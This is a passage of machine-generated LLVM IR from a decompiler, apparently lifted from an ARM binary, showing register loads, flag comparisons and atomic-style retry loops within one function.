  store i1 %v3_fc00, i1* %cpsr_c.global-to-local, align 1
  %v9_fc00 = icmp eq i32 %v2_fbfc, %v1_fc00.pre
  br i1 %v9_fc00, label %dec_label_pc_fc08, label %dec_label_pc_fc20

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fc08
  %v0_fc1c = load i32, i32* @r4, align 4
  store i32 %v0_fc1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc20

dec_label_pc_fc20:                                ; preds = %dec_label_pc_fbec, %dec_label_pc_fc08.dec_label_pc_fbfc_crit_edge, %dec_label_pc_fc1c
  %v0_fc20 = phi i32 [ %v0_fc1c, %dec_label_pc_fc1c ], [ %v2_fbfc116, %dec_label_pc_fbec ], [ %v2_fbfc, %dec_label_pc_fc08.dec_label_pc_fbfc_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc20 = icmp eq i32 %v0_fc20, 0
  br i1 %v2_fc20, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_fc20
  %v1_fc24 = load i32, i32* @r7, align 4
  store i32 %v1_fc24, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_fc20, %bb
  %v1_fc28 = xor i1 %v2_fc20, true
  call void @__pseudo_cond_branch(i1 %v1_fc28, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_fc2c = load i32, i32* @r6, align 4
  %v1_fc2c = load i32, i32* @r5, align 4
  %v2_fc2c = add i32 %v1_fc2c, 64
  %v3_fc2c = inttoptr i32 %v2_fc2c to i32*
  store i32 %v0_fc2c, i32* %v3_fc2c, align 4
  %v0_fc30.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fc30

dec_label_pc_fc30:                                ; preds = %dec_label_pc_fbd8, %bb41
  %v0_fc30 = phi i32 [ %v0_fbdc, %dec_label_pc_fbd8 ], [ %v0_fc30.pre, %bb41 ]
  %v1_fc30 = add i32 %v0_fc30, 60
  %v2_fc30 = inttoptr i32 %v1_fc30 to i32*
  %v3_fc30 = load i32, i32* %v2_fc30, align 4
  %v1_fc34 = add i32 %v3_fc30, 1
  store i32 %v1_fc34, i32* %r3.global-to-local, align 4
  store i32 %v1_fc34, i32* %v2_fc30, align 4
  %v0_fc3c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fc3c

dec_label_pc_fc3c:                                ; preds = %dec_label_pc_fbb8, %dec_label_pc_fc30
  %v1_fc44 = phi i32 [ %tmp, %dec_label_pc_fbb8 ], [ %v0_fc3c.pre, %dec_label_pc_fc30 ]
  %v1_fc3c = inttoptr i32 %v1_fc44 to i16*
  %v2_fc3c = load i16, i16* %v1_fc3c, align 2
  %v3_fc3c = zext i16 %v2_fc3c to i32
  store i32 %v3_fc3c, i32* %r3.global-to-local, align 4
  %v1_fc40 = and i32 %v3_fc3c, 64
  %v2_fc40 = icmp eq i32 %v1_fc40, 0
  br i1 %v2_fc40, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_fc3c
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_fc3c, %bb42
  %storemerge = phi i32 [ %v1_fc44, %bb42 ], [ %v1_fc40, %dec_label_pc_fc3c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 64588, i32* @lr, align 4
  %v1_fc48 = xor i1 %v2_fc40, true
  call void @__pseudo_cond_branch(i1 %v1_fc48, i32 ptrtoint (i32* @global_var_10a8c.445 to i32))
  %v0_fc4c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fc4c, i32* @fp, align 4
  %v0_fc50 = load i32, i32* @r5, align 4
  %v1_fc50 = add i32 %v0_fc50, 4
  %v2_fc50 = inttoptr i32 %v1_fc50 to i32*
  %v3_fc50 = load i32, i32* %v2_fc50, align 4
  store i32 %v3_fc50, i32* %r0.global-to-local, align 4
  %v1_fc54 = call i32 @function_e720(i32 %v3_fc50)
  store i32 %v1_fc54, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_fc5c = load i32, i32* @r8, align 4
  %v2_fc5c = add i32 %v0_fc5c, 160
  %v3_fc5c = inttoptr i32 %v2_fc5c to i32*
  %v4_fc5c = load i32, i32* %v3_fc5c, align 4
  store i32 %v4_fc5c, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_fc60 = icmp slt i32 %v1_fc54, 0
  br i1 %v1_fc60, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* @fp, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_fc68 = add i32 %v4_fc5c, 8
  %v2_fc68 = inttoptr i32 %v1_fc68 to i32*
  %v3_fc68 = load i32, i32* %v2_fc68, align 4
  store i32 %v3_fc68, i32* %r3.global-to-local, align 4
  %v0_fc6c = call i32 @function_f150()
  store i32 %v0_fc6c, i32* %r0.global-to-local, align 4
  %v1_fc70 = add i32 %v0_fc6c, -1168
  store i32 %v1_fc70, i32* %sl.global-to-local, align 4
  %v0_fc74 = load i32, i32* %r3.global-to-local, align 4
  %v3_fc74 = icmp uge i32 %v0_fc74, %v1_fc70
  store i1 %v3_fc74, i1* %cpsr_c.global-to-local, align 1
  %v9_fc74 = icmp eq i32 %v0_fc74, %v1_fc70
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fc7c = load i32, i32* @r5, align 4
  %v2_fc7c = add i32 %v1_fc7c, 4
  %v3_fc7c = inttoptr i32 %v2_fc7c to i32*
  store i32 -1, i32* %v3_fc7c, align 4
  br i1 %v9_fc74, label %dec_label_pc_fcc4, label %dec_label_pc_fc84

dec_label_pc_fc84:                                ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_fc88 = load i32, i32* @r7, align 4
  store i32 %v0_fc88, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_fc90108 = inttoptr i32 %v0_fc88 to i32*
  %v2_fc90109 = load i32, i32* %v1_fc90108, align 4
  store i32 %v2_fc90109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_fc94111 = icmp eq i32 %v2_fc90109, 0
  br i1 %v9_fc94111, label %dec_label_pc_fc9c, label %dec_label_pc_fcb4

dec_label_pc_fc9c:                                ; preds = %dec_label_pc_fc84, %dec_label_pc_fc9c.dec_label_pc_fc90_crit_edge
  %v0_fc9c112 = phi i32 [ %v1_fc94.pre, %dec_label_pc_fc9c.dec_label_pc_fc90_crit_edge ], [ 0, %dec_label_pc_fc84 ]
  store i32 %v0_fc9c112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fcac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fcac, label %dec_label_pc_fcb0, label %dec_label_pc_fc9c.dec_label_pc_fc90_crit_edge

dec_label_pc_fc9c.dec_label_pc_fc90_crit_edge:    ; preds = %dec_label_pc_fc9c
  %v0_fc90.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fc94.pre = load i32, i32* @r4, align 4
  %v1_fc90 = inttoptr i32 %v0_fc90.pre to i32*
  %v2_fc90 = load i32, i32* %v1_fc90, align 4
  store i32 %v2_fc90, i32* %r3.global-to-local, align 4
  %v3_fc94 = icmp uge i32 %v2_fc90, %v1_fc94.pre
  store i1 %v3_fc94, i1* %cpsr_c.global-to-local, align 1
  %v9_fc94 = icmp eq i32 %v2_fc90, %v1_fc94.pre
  br i1 %v9_fc94, label %dec_label_pc_fc9c, label %dec_label_pc_fcb4

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fc9c
  %v0_fcb0 = load i32, i32* @r4, align 4
  store i32 %v0_fcb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fcb4

dec_label_pc_fcb4:                                ; preds = %dec_label_pc_fc84, %dec_label_pc_fc9c.dec_label_pc_fc90_crit_edge, %dec_label_pc_fcb0
  %v0_fcb4 = phi i32 [ %v0_fcb0, %dec_label_pc_fcb0 ], [ %v2_fc90109, %dec_label_pc_fc84 ], [ %v2_fc90, %dec_label_pc_fc9c.dec_label_pc_fc90_crit_edge ]
  %v1_fcb4 = phi i32 [ %v0_fcb0, %dec_label_pc_fcb0 ], [ 0, %dec_label_pc_fc84 ], [ %v1_fc94.pre, %dec_label_pc_fc9c.dec_label_pc_fc90_crit_edge ]
  %v3_fcb4 = icmp uge i32 %v0_fcb4, %v1_fcb4
  store i1 %v3_fcb4, i1* %cpsr_c.global-to-local, align 1
  %v9_fcb4 = icmp eq i32 %v0_fcb4, %v1_fcb4
  br i1 %v9_fcb4, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_fcb4
  %v1_fcb8 = load i32, i32* @r7, align 4
  store i32 %v1_fcb8, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_fcb4, %bb46
  %v1_fcbc = xor i1 %v9_fcb4, true
  call void @__pseudo_cond_branch(i1 %v1_fcbc, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_fcc0 = load i32, i32* %sl.global-to-local, align 4
  %v1_fcc0 = load i32, i32* @r7, align 4
  %v2_fcc0 = add i32 %v1_fcc0, 8
  %v3_fcc0 = inttoptr i32 %v2_fcc0 to i32*
  store i32 %v0_fcc0, i32* %v3_fcc0, align 4
  br label %dec_label_pc_fcc4

dec_label_pc_fcc4:                                ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_fcc8 = load i32, i32* @r8, align 4
  %v2_fcc8 = add i32 %v0_fcc8, 160
  %v3_fcc8 = inttoptr i32 %v2_fcc8 to i32*
  %v4_fcc8 = load i32, i32* %v3_fcc8, align 4
  store i32 %v4_fcc8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_fcd0 = add i32 %v0_fcc8, 12
  %v3_fcd0 = inttoptr i32 %v2_fcd0 to i32*
  %v4_fcd0 = load i32, i32* %v3_fcd0, align 4
  store i32 %v4_fcd0, i32* %r2.global-to-local, align 4
  %v1_fcd4 = add i32 %v4_fcc8, 4
  %v2_fcd4 = inttoptr i32 %v1_fcd4 to i32*
  %v3_fcd4 = load i32, i32* %v2_fcd4, align 4
  store i32 %v3_fcd4, i32* %r1.global-to-local, align 4
  %v1_fcd8 = inttoptr i32 %v4_fcd0 to i32*
  %v2_fcd8 = load i32, i32* %v1_fcd8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fcdc = icmp eq i32 %v3_fcd4, 0
  %v1_fce0 = add i32 %v2_fcd8, 1
  store i32 %v1_fce0, i32* %r3.global-to-local, align 4
  store i32 %v1_fce0, i32* %v1_fcd8, align 4
  br i1 %v2_fcdc, label %dec_label_pc_fcec, label %dec_label_pc_fd4c

dec_label_pc_fcec:                                ; preds = %dec_label_pc_fcc4
  %v0_fcec = load i32, i32* %r1.global-to-local, align 4
  %v1_fcec = load i32, i32* %r0.global-to-local, align 4
  %v2_fcec = add i32 %v1_fcec, 8
  %v3_fcec = inttoptr i32 %v2_fcec to i32*
  store i32 %v0_fcec, i32* %v3_fcec, align 4
  %v0_fcf0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fcf0, i32* @r7, align 4
  br label %dec_label_pc_fcf4

dec_label_pc_fcf4:                                ; preds = %dec_label_pc_fd24.dec_label_pc_fcf4_crit_edge, %dec_label_pc_fcec
  %v0_fcf4 = phi i32 [ %v0_fcf4.pre, %dec_label_pc_fd24.dec_label_pc_fcf4_crit_edge ], [ %v0_fcf0, %dec_label_pc_fcec ]
  %v1_fcf4 = inttoptr i32 %v0_fcf4 to i32*
  %v2_fcf4 = load i32, i32* %v1_fcf4, align 4
  store i32 %v2_fcf4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_fcf4, i32* %r2.global-to-local, align 4
  %v2_fd0096 = load i32, i32* %v1_fcf4, align 4
  store i32 %v2_fd0096, i32* %r3.global-to-local, align 4
  %v3_fd0498 = icmp uge i32 %v2_fd0096, %v2_fcf4
  store i1 %v3_fd0498, i1* %cpsr_c.global-to-local, align 1
  %v9_fd04104 = icmp eq i32 %v2_fd0096, %v2_fcf4
  br i1 %v9_fd04104, label %dec_label_pc_fd0c, label %dec_label_pc_fd24

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_fcf4, %dec_label_pc_fd0c.dec_label_pc_fd00_crit_edge
  %v0_fd0c105 = phi i32 [ %v1_fd04.pre, %dec_label_pc_fd0c.dec_label_pc_fd00_crit_edge ], [ %v2_fcf4, %dec_label_pc_fcf4 ]
  store i32 %v0_fd0c105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fd1c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fd1c, label %dec_label_pc_fd20, label %dec_label_pc_fd0c.dec_label_pc_fd00_crit_edge

dec_label_pc_fd0c.dec_label_pc_fd00_crit_edge:    ; preds = %dec_label_pc_fd0c
  %v0_fd00.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fd04.pre = load i32, i32* @r4, align 4
  %v1_fd00 = inttoptr i32 %v0_fd00.pre to i32*
  %v2_fd00 = load i32, i32* %v1_fd00, align 4
  store i32 %v2_fd00, i32* %r3.global-to-local, align 4
  %v3_fd04 = icmp uge i32 %v2_fd00, %v1_fd04.pre
  store i1 %v3_fd04, i1* %cpsr_c.global-to-local, align 1
  %v9_fd04 = icmp eq i32 %v2_fd00, %v1_fd04.pre
  br i1 %v9_fd04, label %dec_label_pc_fd0c, label %dec_label_pc_fd24

dec_label_pc_fd20:                                ; preds = %dec_label_pc_fd0c
  %v0_fd20 = load i32, i32* @r4, align 4
  store i32 %v0_fd20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fd24

dec_label_pc_fd24:                                ; preds = %dec_label_pc_fcf4, %dec_label_pc_fd0c.dec_label_pc_fd00_crit_edge, %dec_label_pc_fd20
  %v0_fd2c = phi i32 [ %v0_fd20, %dec_label_pc_fd20 ], [ %v2_fd0096, %dec_label_pc_fcf4 ], [ %v2_fd00, %dec_label_pc_fd0c.dec_label_pc_fd00_crit_edge ]
  %v1_fd24 = phi i32 [ %v0_fd20, %dec_label_pc_fd20 ], [ %v2_fcf4, %dec_label_pc_fcf4 ], [ %v1_fd04.pre, %dec_label_pc_fd0c.dec_label_pc_fd00_crit_edge ]
  %v3_fd24 = icmp uge i32 %v0_fd2c, %v1_fd24
  store i1 %v3_fd24, i1* %cpsr_c.global-to-local, align 1
  %v9_fd24 = icmp eq i32 %v0_fd2c, %v1_fd24
  br i1 %v9_fd24, label %dec_label_pc_fd2c, label %dec_label_pc_fd24.dec_label_pc_fcf4_crit_edge

dec_label_pc_fd24.dec_label_pc_fcf4_crit_edge:    ; preds = %dec_label_pc_fd24
  %v0_fcf4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_fcf4

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fd24
  %v2_fd2c = icmp ne i32 %v1_fd24, 0
  store i1 %v2_fd2c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd30 = icmp slt i32 %v1_fd24, 2
  br i1 %v7_fd30, label %dec_label_pc_fd4c, label %dec_label_pc_fd34

dec_label_pc_fd34:                                ; preds = %dec_label_pc_fd2c
  %v0_fd34 = load i32, i32* @r7, align 4
  store i32 %v0_fd34, i32* %r0.global-to-local, align 4
  %v0_fd38 = load i32, i32* %r1.global-to-local, align 4
  %v1_fd38 = add i32 %v0_fd38, 129
  store i32 %v1_fd38, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fd4c

dec_label_pc_fd4c:                                ; preds = %dec_label_pc_fcc4, %dec_label_pc_fd34, %dec_label_pc_fd2c
  %v0_fd4c = load i32, i32* @r5, align 4
  %v1_fd4c = inttoptr i32 %v0_fd4c to i16*
  %v2_fd4c = load i16, i16* %v1_fd4c, align 2
  %v3_fd4c = zext i16 %v2_fd4c to i32
  %v1_fd50 = and i32 %v3_fd4c, 24576
  %v1_fd54 = or i32 %v1_fd50, 48
  store i32 %v1_fd54, i32* %r3.global-to-local, align 4
  %v0_fd58 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd58 = icmp eq i32 %v0_fd58, 0
  %v1_fd5c = trunc i32 %v1_fd54 to i16
  store i16 %v1_fd5c, i16* %v1_fd4c, align 2
  br i1 %v2_fd58, label %dec_label_pc_fd64, label %dec_label_pc_fdd8

dec_label_pc_fd64:                                ; preds = %dec_label_pc_fd4c
  %v0_fd64 = load i32, i32* @r5, align 4
  %v1_fd64 = add i32 %v0_fd64, 60
  %v2_fd64 = inttoptr i32 %v1_fd64 to i32*
  %v3_fd64 = load i32, i32* %v2_fd64, align 4
  %v1_fd68 = add i32 %v3_fd64, -1
  store i32 %v1_fd68, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fd6c = icmp eq i32 %v1_fd68, 0
  store i32 %v1_fd68, i32* %v2_fd64, align 4
  br i1 %v2_fd6c, label %dec_label_pc_fd78, label %dec_label_pc_fdd8

dec_label_pc_fd78:                                ; preds = %dec_label_pc_fd64
  %v0_fd78 = load i32, i32* %r3.global-to-local, align 4
  %v1_fd78 = load i32, i32* @r5, align 4
  %v2_fd78 = add i32 %v1_fd78, 64
  %v3_fd78 = inttoptr i32 %v2_fd78 to i32*
  store i32 %v0_fd78, i32* %v3_fd78, align 4
  %v0_fd7c = load i32, i32* @r5, align 4
  %v1_fd7c = add i32 %v0_fd7c, 56
  store i32 %v1_fd7c, i32* @r6, align 4
  br label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fdb0.dec_label_pc_fd80_crit_edge, %dec_label_pc_fd78
  %v0_fd88 = phi i32 [ %v0_fd88.pre, %dec_label_pc_fdb0.dec_label_pc_fd80_crit_edge ], [ %v1_fd7c, %dec_label_pc_fd78 ]
  %v0_fd80 = phi i32 [ %v0_fd80.pre, %dec_label_pc_fdb0.dec_label_pc_fd80_crit_edge ], [ %v0_fd7c, %dec_label_pc_fd78 ]
  %v1_fd80 = add i32 %v0_fd80, 56
  %v2_fd80 = inttoptr i32 %v1_fd80 to i32*
  %v3_fd80 = load i32, i32* %v2_fd80, align 4
  store i32 %v3_fd80, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_fd88, i32* %r2.global-to-local, align 4
  %v1_fd8c82 = inttoptr i32 %v0_fd88 to i32*
  %v2_fd8c83 = load i32, i32* %v1_fd8c82, align 4
  store i32 %v2_fd8c83, i32* %r3.global-to-local, align 4
  %v3_fd9085 = icmp uge i32 %v2_fd8c83, %v3_fd80
  store i1 %v3_fd9085, i1* %cpsr_c.global-to-local, align 1
  %v9_fd9091 = icmp eq i32 %v2_fd8c83, %v3_fd80
  br i1 %v9_fd9091, label %dec_label_pc_fd98, label %dec_label_pc_fdb0

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd80, %dec_label_pc_fd98.dec_label_pc_fd8c_crit_edge
  %v0_fd9892 = phi i32 [ %v1_fd90.pre, %dec_label_pc_fd98.dec_label_pc_fd8c_crit_edge ], [ %v3_fd80, %dec_label_pc_fd80 ]
  store i32 %v0_fd9892, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fda8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fda8, label %dec_label_pc_fdac, label %dec_label_pc_fd98.dec_label_pc_fd8c_crit_edge

dec_label_pc_fd98.dec_label_pc_fd8c_crit_edge:    ; preds = %dec_label_pc_fd98
  %v0_fd8c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fd90.pre = load i32, i32* @r4, align 4
  %v1_fd8c = inttoptr i32 %v0_fd8c.pre to i32*
  %v2_fd8c = load i32, i32* %v1_fd8c, align 4
  store i32 %v2_fd8c, i32* %r3.global-to-local, align 4
  %v3_fd90 = icmp uge i32 %v2_fd8c, %v1_fd90.pre
  store i1 %v3_fd90, i1* %cpsr_c.global-to-local, align 1
  %v9_fd90 = icmp eq i32 %v2_fd8c, %v1_fd90.pre
  br i1 %v9_fd90, label %dec_label_pc_fd98, label %dec_label_pc_fdb0

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fd98
  %v0_fdac = load i32, i32* @r4, align 4
  store i32 %v0_fdac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fdb0

dec_label_pc_fdb0:                                ; preds = %dec_label_pc_fd80, %dec_label_pc_fd98.dec_label_pc_fd8c_crit_edge, %dec_label_pc_fdac
  %v0_fdb8 = phi i32 [ %v0_fdac, %dec_label_pc_fdac ], [ %v2_fd8c83, %dec_label_pc_fd80 ], [ %v2_fd8c, %dec_label_pc_fd98.dec_label_pc_fd8c_crit_edge ]
  %v1_fdb0 = phi i32 [ %v0_fdac, %dec_label_pc_fdac ], [ %v3_fd80, %dec_label_pc_fd80 ], [ %v1_fd90.pre, %dec_label_pc_fd98.dec_label_pc_fd8c_crit_edge ]
  %v3_fdb0 = icmp uge i32 %v0_fdb8, %v1_fdb0
  store i1 %v3_fdb0, i1* %cpsr_c.global-to-local, align 1
  %v9_fdb0 = icmp eq i32 %v0_fdb8, %v1_fdb0
  br i1 %v9_fdb0, label %dec_label_pc_fdb8, label %dec_label_pc_fdb0.dec_label_pc_fd80_crit_edge

dec_label_pc_fdb0.dec_label_pc_fd80_crit_edge:    ; preds = %dec_label_pc_fdb0
  %v0_fd80.pre = load i32, i32* @r5, align 4
  %v0_fd88.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_fd80

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fdb0
  %v2_fdb8 = icmp ne i32 %v1_fdb0, 0
  store i1 %v2_fdb8, i1* %cpsr_c.global-to-local, align 1
  %v7_fdbc = icmp slt i32 %v1_fdb0, 2
  br i1 %v7_fdbc, label %dec_label_pc_fdd8, label %dec_label_pc_fdc0

dec_label_pc_fdc0:                                ; preds = %dec_label_pc_fdb8
  %v0_fdc0 = load i32, i32* @r5, align 4
  %v1_fdc0 = add i32 %v0_fdc0, 56
  store i32 %v1_fdc0, i32* %r0.global-to-local, align 4
  %v0_fdc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_fdc4 = add i32 %v0_fdc4, 129
  store i32 %v1_fdc4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fdd8

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fd64, %dec_label_pc_fd4c, %dec_label_pc_fdc0, %dec_label_pc_fdb8
  %v0_fdd8 = load i32, i32* @r5, align 4
  %v1_fdd8 = inttoptr i32 %v0_fdd8 to i16*
  %v2_fdd8 = load i16, i16* %v1_fdd8, align 2
  %v3_fdd8 = zext i16 %v2_fdd8 to i32
  store i32 %v3_fdd8, i32* %r3.global-to-local, align 4
  %v1_fddc = and i32 %v3_fdd8, 16384
  %v2_fddc = icmp eq i32 %v1_fddc, 0
  br i1 %v2_fddc, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_fdd8
  %v2_fde0 = add i32 %v0_fdd8, 8
  %v3_fde0 = inttoptr i32 %v2_fde0 to i32*
  %v4_fde0 = load i32, i32* %v3_fde0, align 4
  store i32 %v4_fde0, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_fdd8, %bb48
  %v1_fde4 = xor i1 %v2_fddc, true
  call void @__pseudo_cond_branch(i1 %v1_fde4, i32 ptrtoint (i32* @global_var_d458.137 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_fdec = load i32, i32* @r8, align 4
  %v2_fdec = add i32 %v0_fdec, 160
  %v3_fdec = inttoptr i32 %v2_fdec to i32*
  %v4_fdec = load i32, i32* %v3_fdec, align 4
  store i32 %v4_fdec, i32* @r5, align 4
  %v1_fdf0 = add i32 %v4_fdec, 8
  %v2_fdf0 = inttoptr i32 %v1_fdf0 to i32*
  %v3_fdf0 = load i32, i32* %v2_fdf0, align 4
  store i32 %v3_fdf0, i32* %r3.global-to-local, align 4
  %v1_fdf4 = load i32, i32* %sl.global-to-local, align 4
  %v3_fdf4 = icmp uge i32 %v3_fdf0, %v1_fdf4
  store i1 %v3_fdf4, i1* %cpsr_c.global-to-local, align 1
  %v9_fdf4 = icmp eq i32 %v3_fdf0, %v1_fdf4
  br i1 %v9_fdf4, label %dec_label_pc_fe3c, label %dec_label_pc_fdfc

dec_label_pc_fdfc:                                ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_fdec, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_fe0875 = inttoptr i32 %v4_fdec to i32*
  %v2_fe0876 = load i32, i32* %v1_fe0875, align 4
  store i32 %v2_fe0876, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_fe0c78 = icmp eq i32 %v2_fe0876, 0
  br i1 %v9_fe0c78, label %dec_label_pc_fe14, label %dec_label_pc_fe2c

dec_label_pc_fe14:                                ; preds = %dec_label_pc_fdfc, %dec_label_pc_fe14.dec_label_pc_fe08_crit_edge
  %v0_fe1479 = phi i32 [ %v1_fe0c.pre, %dec_label_pc_fe14.dec_label_pc_fe08_crit_edge ], [ 0, %dec_label_pc_fdfc ]
  store i32 %v0_fe1479, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fe24 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fe24, label %dec_label_pc_fe28, label %dec_label_pc_fe14.dec_label_pc_fe08_crit_edge

dec_label_pc_fe14.dec_label_pc_fe08_crit_edge:    ; preds = %dec_label_pc_fe14
  %v0_fe08.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fe0c.pre = load i32, i32* @r4, align 4
  %v1_fe08 = inttoptr i32 %v0_fe08.pre to i32*
  %v2_fe08 = load i32, i32* %v1_fe08, align 4
  store i32 %v2_fe08, i32* %r3.global-to-local, align 4
  %v3_fe0c = icmp uge i32 %v2_fe08, %v1_fe0c.pre
  store i1 %v3_fe0c, i1* %cpsr_c.global-to-local, align 1
  %v9_fe0c = icmp eq i32 %v2_fe08, %v1_fe0c.pre
  br i1 %v9_fe0c, label %dec_label_pc_fe14, label %dec_label_pc_fe2c

dec_label_pc_fe28:                                ; preds = %dec_label_pc_fe14
  %v0_fe28 = load i32, i32* @r4, align 4
  store i32 %v0_fe28, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe2c

dec_label_pc_fe2c:                                ; preds = %dec_label_pc_fdfc, %dec_label_pc_fe14.dec_label_pc_fe08_crit_edge, %dec_label_pc_fe28
  %v0_fe2c = phi i32 [ %v0_fe28, %dec_label_pc_fe28 ], [ %v2_fe0876, %dec_label_pc_fdfc ], [ %v2_fe08, %dec_label_pc_fe14.dec_label_pc_fe08_crit_edge ]
  %v1_fe2c = phi i32 [ %v0_fe28, %dec_label_pc_fe28 ], [ 0, %dec_label_pc_fdfc ], [ %v1_fe0c.pre, %dec_label_pc_fe14.dec_label_pc_fe08_crit_edge ]
  %v3_fe2c = icmp uge i32 %v0_fe2c, %v1_fe2c
  store i1 %v3_fe2c, i1* %cpsr_c.global-to-local, align 1
  %v9_fe2c = icmp eq i32 %v0_fe2c, %v1_fe2c
  br i1 %v9_fe2c, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_fe2c
  %v1_fe30 = load i32, i32* @r5, align 4
  store i32 %v1_fe30, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_fe2c, %bb50
  %v1_fe34 = xor i1 %v9_fe2c, true
  call void @__pseudo_cond_branch(i1 %v1_fe34, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_fe38 = load i32, i32* %sl.global-to-local, align 4
  %v1_fe38 = load i32, i32* @r5, align 4
  %v2_fe38 = add i32 %v1_fe38, 8
  %v3_fe38 = inttoptr i32 %v2_fe38 to i32*
  store i32 %v0_fe38, i32* %v3_fe38, align 4
  %v0_fe40.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_fe3c

dec_label_pc_fe3c:                                ; preds = %bb49, %bb51
  %v0_fe40 = phi i32 [ %v0_fdec, %bb49 ], [ %v0_fe40.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_fe40 = add i32 %v0_fe40, 80
  %v3_fe40 = inttoptr i32 %v2_fe40 to i32*
  %v4_fe40 = load i32, i32* %v3_fe40, align 4
  store i32 %v4_fe40, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_fe48 = add i32 %v0_fe40, 160
  %v3_fe48 = inttoptr i32 %v2_fe48 to i32*
  %v4_fe48 = load i32, i32* %v3_fe48, align 4
  store i32 %v4_fe48, i32* %r0.global-to-local, align 4
  %v1_fe4c = inttoptr i32 %v4_fe40 to i32*
  %v2_fe4c = load i32, i32* %v1_fe4c, align 4
  store i32 %v2_fe4c, i32* %r3.global-to-local, align 4
  %v1_fe50 = add i32 %v4_fe48, 4
  %v2_fe50 = inttoptr i32 %v1_fe50 to i32*
  %v3_fe50 = load i32, i32* %v2_fe50, align 4
  store i32 %v3_fe50, i32* %r1.global-to-local, align 4
